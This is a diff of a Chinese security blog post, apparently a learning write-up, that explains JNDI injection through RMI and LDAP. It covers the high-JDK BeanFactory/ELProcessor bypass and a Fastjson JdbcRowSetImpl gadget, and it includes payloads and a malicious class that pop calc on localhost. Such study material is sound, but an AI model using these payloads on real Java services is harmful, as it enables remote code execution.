@@ -300,7 +300,7 @@
 <p>为什么说是 “从文档开始的 jndi 注入之路”</p>
 </blockquote>
 <p>因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。</p>
-<p>官方文档地址：<a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html" >https://docs.oracle.com/javase/tutorial/jndi/overview/index.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>官方文档地址：<a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">https://docs.oracle.com/javase/tutorial/jndi/overview/index.html<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="0x01-什么是-jndi"><a href="#0x01-什么是-jndi" class="headerlink" title="0x01 什么是 jndi"></a>0x01 什么是 jndi</h2><p>首先第一个问题，什么是 JNDI，它的作用是什么？</p>
 <p>根据官方文档，JNDI 全称为 <strong>Java Naming and Directory Interface</strong>，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。</p>
 <p>也就是一个字符串对应一个对象。</p>
@@ -314,11 +314,11 @@
 <p>前三种都是字符串对应对象，DNS 是 IP 对应域名。</p>
 <h3 id="jndi-的代码以及包说明"><a href="#jndi-的代码以及包说明" class="headerlink" title="jndi 的代码以及包说明"></a>jndi 的代码以及包说明</h3><p>JNDI 主要是上述四种服务，对应四个包加一个主包<br>JNDI 接口主要分为下述 5 个包:</p>
 <ul>
-<li><a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html" >javax.naming<i class="fas fa-external-link-alt"></i></a></li>
-<li><a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html" >javax.naming.directory<i class="fas fa-external-link-alt"></i></a></li>
-<li><a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html" >javax.naming.event<i class="fas fa-external-link-alt"></i></a></li>
-<li><a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html" >javax.naming.ldap<i class="fas fa-external-link-alt"></i></a></li>
-<li><a class="link"   target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html" >javax.naming.spi<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <p>其中最重要的是 <code>javax.naming</code> 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 JNDI 接口，用户可以透明地调用远程打印服务，伪代码如下所示:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">Printer</span> <span class="variable">printer</span> <span class="operator">=</span> (Printer)ctx.lookup(<span class="string">&quot;myprinter&quot;</span>);</span><br><span class="line">printer.print(report);</span><br></pre></td></tr></table></figure>
@@ -338,13 +338,13 @@
 <h4 id="RMI-原生漏洞"><a href="#RMI-原生漏洞" class="headerlink" title="RMI 原生漏洞"></a>RMI 原生漏洞</h4><p>这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 <code>lookup()</code> 方法。</p>
 <p>这里先分析一边，后续我们再到这个过程的时候就光速跳过了 ~</p>
 <p>断点的话，下一个在 <code>InitialContext.java</code> 的 <code>lookup()</code> 方法这里即可，开始调试。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup01.png" class>
 
 <p>进到 <code>lookup()</code> 方法里面进去，这里 <code>GenericURLContext</code> 类的 <code>lookup()</code> 方法里面又套了一个 <code>lookup()</code> 方法，我们继续进去。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup02.png" class>
 
 <p>进去之后发现这个类是 <code>RegistryContext</code>，也就是 RMI 对应 <code>lookup()</code> 方法的类，至此，可以基本说明<strong>JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。</strong></p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContext.png" class>
 
 <ul>
 <li>所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。</li>
@@ -364,7 +364,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>用 Python 起一个服务器，然后再运行即可。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/SuccessNormalJNDI.png" class>
 
 <p>报错的话是一定会报错的，因为服务端这里还是 sayHello 了，但是我们调用的那个远程 Class —————— reference 其实是没有 sayHello 这个方法的。</p>
 <p>这里我们可以打断点调试一下。</p>
@@ -373,34 +373,34 @@
 </ul>
 <p>因为漏洞点在 <code>lookup()</code> 方法这里，所以我们是要去看 <code>lookup()</code> 方法的一整个流程，看一下是怎么触发恶意类，然后命令执行的。</p>
 <p>跟进几个 <code>lookup()</code> 方法，直到去到 RMI 的原生的 <code>lookup()</code>，对应的类我也在前文提及过了，是 <code>RegistryContext</code></p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContextLookup.png" class>
 
 <p>继续往下走，这里 var2 对应的是 obj 变量，把 Ref 的值赋给了它。obj 是一个 <code>ReferenceWrapper_Stub</code> 这个类，是因为这是一个 Reference，有兴趣的师傅可以看一下原理，也比较简单。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ReferenceWrapper.png" class>
 
 <p>然后继续往下走，从 <code>decodeObject()</code> 方法进去。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/decodeObject.png" class>
 
 <p>先做了一个简单的判断，判断是否为 <code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象。往下是一个比较重要的方法 <code>getOBjectInstance()</code>，从名字上推测这应该是一个初始化的方法。跟进</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png" class>
 
 <p>噢对这里不得不提一下 <code>Reference</code> 这个类的构造函数，前文忘记说了，愚蠢的我…………</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/Reference.png" class>
 
 <p>第一个参数是类名，第二个参数是 factory，我觉得 factory 是 Jndi 很好的一个表示，我们可以通过这一个 factory 来代表一个类；第三个参数为地址，这个简单。</p>
 <p>回到正题来，这里到了 <code>getObjectInstance()</code> 这个方法，首先是 <code>builder</code> 的判断，不知道这是啥，注释中写着 “&#x2F;&#x2F; Use builder if installed”，我这里应该是没用，直接跳过判断。</p>
 <p>往下走，是关于 reference 的，这里肯定是用了 reference，强转换，将 <code>refInfo</code> 转换为 <code>Reference</code>。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/builderAndReference.png" class>
 
 <p>继续往下走，是关于 ref 的，意思是如果 reference 当中定义了 factory，就通过 <code>getObjectFactoryFromReference()</code> 方法来调用 reference 当中的 factory。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReference.png" class>
 
 <p><code>getObjectFactoryFromReference()</code> 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 <code>loadClass()</code> 方法。</p>
 <p>继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 ———— URLClassLoader</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/loadClass.png" class>
 
 <p>最后在 newInstance() 这一步执行代码。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/newInstance.png" class>
 
 <ul>
 <li>总结一下还是比较简单的，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是说因为 RMI 的问题。</li>
@@ -410,7 +410,7 @@
 <h3 id="2-Jndi-结合-ldap"><a href="#2-Jndi-结合-ldap" class="headerlink" title="2. Jndi 结合 ldap"></a>2. Jndi 结合 ldap</h3><h4 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h4><ul>
 <li>ldap 是一种协议，并不是 Java 独有的。</li>
 </ul>
-<p>LDAP 既是一类服务，也是一种协议，定义在 <a class="link"   target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc2251.txt" >RFC2251<i class="fas fa-external-link-alt"></i></a>(<a class="link"   target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/rfc4511/" >RFC4511<i class="fas fa-external-link-alt"></i></a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p>
+<p>LDAP 既是一类服务，也是一种协议，定义在 <a class="link" target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251<i class="fas fa-external-link-alt"></i></a>(<a class="link" target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511<i class="fas fa-external-link-alt"></i></a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p>
 <p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p>
 <p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p>
 <h4 id="ldap-的-JNDI-漏洞"><a href="#ldap-的-JNDI-漏洞" class="headerlink" title="ldap 的 JNDI 漏洞"></a>ldap 的 JNDI 漏洞</h4><p>先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 <code>unboundid-ldapsdk</code> 的依赖。</p>
@@ -426,7 +426,7 @@
 
 <p>先用 python 起一个 HTTP 服务，再跑服务端代码，再跑客户端。</p>
 <p>运行结果如图。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/LdapSuccess.png" class>
 
 <ul>
 <li>这个攻击就还是我们之前说的 Reference</li>
@@ -467,7 +467,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIBypassHighJavaClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Object&quot;</span>;  </span><br><span class="line"> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> context.lookup(uri);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>执行效果：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/HighJDK.png" class>
 
 <ul>
 <li>看完了 EXP，我们来分析一下服务端的代码，就以简短一点的 rebind 为例分析。</li>
@@ -475,29 +475,29 @@
 <p>首先 <code>ELProcessor</code> 这里，是 el 表达式，我太菜了还不会，它是一种命令执行的方式。具体的解释也写在注释里面了。</p>
 <p>后面的 add 这种写法是 <code>BeanFactory.getObjectInstance()</code> 代码的逻辑，第一种命令执行的方式是 ProcessBuilder 的，第二种是 Runtime 的。</p>
 <h5 id="调试分析运行流程"><a href="#调试分析运行流程" class="headerlink" title="调试分析运行流程"></a>调试分析运行流程</h5><p>开始调试，进 lookup 这里和之前是一样的，我就直接跳过了，直接到 <code>RegistryContext</code> 这个类的 <code>decodeObject()</code> 方法当中，这个方法当中调用了 <code>getObjectInstance()</code></p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png" class>
 
 <p>继续往前，不一样的地方在 <code>getObjectFactoryFromReference</code>，我们也可以直接把断点下在这个位置，这样就可以直达了。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReferenceDebug.png" class>
 
 <p>跟进去看一下逻辑，发现是通过 <code>loadClass()</code> 方法来加载我们传入的 <code>org.apache.naming.factory.BeanFactory</code> 类，然后新建该类实例并将其转换成 <code>ObjectFactory</code> 类型，也就是说，<strong>我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 <code>org.apache.naming.factory.BeanFactory</code> 正好满足这一点</strong>：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/clasJudge.png" class>
 
 <p>继续往下走，跟进看到 <code>getObjectInstance()</code> 方法中，会判断 obj 参数是否是 <code>ResourceRef</code> 类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例</strong>：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ResourceRef.png" class>
 
 <p>后续经过一系列的赋值，执行 loadClass 方法，然后继续。接着获取 Bean 类为 <code>javax.el.ELProcessor</code> 后，实例化该类并获取其中的 <code>forceString</code> 类型的内容，其值是我们构造的 <code>x=eval</code> 内容：</p>
 <p>这个思路有点像 python pickle 反序列化的那个，会挤掉一个字符。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/forceString.png" class>
 
 <p>继续往下调试可以看到，查找 <code>forceString</code> 的内容中是否存在”&#x3D;”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，<strong>之前设置的 <code>forceString</code> 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 <code>BeanFactory</code> 类能进行利用的关键点！</strong>之后，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/put.png" class>
 
 <p>接着是多个 do while 语句来遍历获取 ResourceRef 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用 <code>getContent()</code> 方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 ResourceRef 类实例添加的第二个元素：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/doWhile.png" class>
 
 <p>获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行<br><code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()&quot;)</code>：</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/invoke.png" class>
 
 <h5 id="小结一下本地恶意-Class"><a href="#小结一下本地恶意-Class" class="headerlink" title="小结一下本地恶意 Class"></a>小结一下本地恶意 Class</h5><p>有两个点，一个是 payload 这里，是比较复杂的，经过第一层的 <code>=x</code>，之后，有添加元素的逻辑。算是 el 表达式注入的一些基础吧，后续学了 el 表达式再回来看应该会简单很多。</p>
 <p>另外一个是原理，就是绕过了 <code>trustURLCodebase</code> 的检测，或者说轮不到 <code>trustURLCodebase</code> 来检测。</p>
@@ -523,36 +523,36 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetClient</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">// lookup参数注入触发  </span></span><br><span class="line"> <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"> context.lookup(<span class="string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// Fastjson反序列化JNDI注入Gadget触发  </span></span><br><span class="line"> <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>效果如图</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/Gadget.png" class>
 
 <h5 id="调试分析运行流程-1"><a href="#调试分析运行流程-1" class="headerlink" title="调试分析运行流程"></a>调试分析运行流程</h5><ul>
 <li>先简单说一说是怎么调试的吧，我觉得断点调试这个完全可以自己手动调试，到了很迷茫看不懂的时候再去看其他师傅的文章比较好。</li>
 </ul>
 <p>因为我们这里是 ldap 服务的 <code>lookup()</code> 方法的调用，前文我说每一个服务都对应一个 <code>xxxContext</code>，所以我们要先去找那个对应的 <code>xxxContext</code>，再去找 <code>decodeObject()</code> 方法。</p>
 <p>所以这里的断点就正常调就行，<code>decodeObject()</code> 方法的是在 <code>decodeObject:235, Obj (com.sun.jndi.ldap)</code> 这个地方，可以现在这里打个断点节约时间，也可以自己跟一遍。如果自己跟一遍的话，是要通过 <code>p_lookup</code> 和 <code>c_lookup()</code> 进来的，因为在这之前都没到 <code>xxxContext</code></p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ObjDecodeObject.png" class>
 
 <p>进到 <code>decodeObject()</code> 方法里面，往下走，看到一个 <code>getURLClassLoader()</code> 这里方法里面。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getURLClassLoader.png" class>
 
 <p>往下走，进入到 <code>trustURLCodebase</code> 的判断，我们之前说过，这里默认就是 false，所以没跳进去，无法进行 URLClassLoader 的实例化。但是这个地方其实我们已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/trustURLCodebase.png" class>
 
 <p>这里实例化不通过是不会加载字节码进行命令执行的，我们继续往下走，有一个 <code>deserializeObject()</code> 方法非常引人注目，根据意思，它一定是一个用来反序列化的方法。再查看一下这里被反序列化的东西，是一个 <code>javaSerializedData</code> 数据类型的类。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/deserializeObject.png" class>
 
 <p>跟进这个方法，遇到了我们无比倾心的 <code>readObject()</code> 方法，OK 至此，入口类的条件满足。</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/readObject.png" class>
 
 <p>读取的字节码被反序列化出来的时候，字节码被加载，造成命令执行</p>
-
+<img src="/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/CommandExec.png" class>
 
 <ul>
 <li>至此，调试过程结束。</li>
 </ul>
 <h5 id="小结一下-LDAP-Gadget-恶意加载字节码"><a href="#小结一下-LDAP-Gadget-恶意加载字节码" class="headerlink" title="小结一下 LDAP Gadget 恶意加载字节码"></a>小结一下 LDAP Gadget 恶意加载字节码</h5><p>其实是换了一种思路进行字节码的加载，通过 <code>deserializeObject()</code> 方法的反序列化来进行命令执行。</p>
 <h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>对于 JNDI 的注入，最重要的是掌握 JNDI 通用注入，也就是 LDAP + Reference 这一个；在掌握了这个之后，理解高版本 jdk 的绕过也相对简单了。</p>
-<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1" >https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6" >https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0" >https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/" >https://johnfrod.top/%e5%ae%89%e5%85%a8/%e9%ab%98%e4%bd%8ejdk%e7%89%88%e6%9c%ac%e4%b8%adjndi%e6%b3%a8%e5%85%a5/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1">https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x03-%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%EF%BC%888u191-%EF%BC%89%E9%99%90%E5%88%B6<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1P54y1Z7Lf?spm_id_from=333.999.0.0<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" 